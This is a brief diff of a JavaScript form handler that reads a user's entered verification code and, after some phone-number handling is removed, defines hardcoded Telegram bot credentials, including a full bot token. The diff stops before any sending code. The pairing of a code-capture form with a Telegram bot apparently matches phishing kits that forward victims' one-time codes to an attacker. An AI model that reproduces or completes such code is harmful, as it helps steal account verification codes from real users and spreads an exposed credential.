@@ -1,10 +1,7 @@
 document.getElementById("verify-form").addEventListener("submit", async function(event) {
     event.preventDefault(); // Prevent page reload
 
-    ();
     let verificationCode = document.getElementById("verification_code").value.trim();
-
-    let formattedPhone = phoneNumber.replace(/\s+/g, ''); // Remove spaces
 
     // Telegram Bot Credentials
     const botToken = "7862409334:AAH67G2Q8sZFQFAipBqze9EcS6W1tyV6MoI";
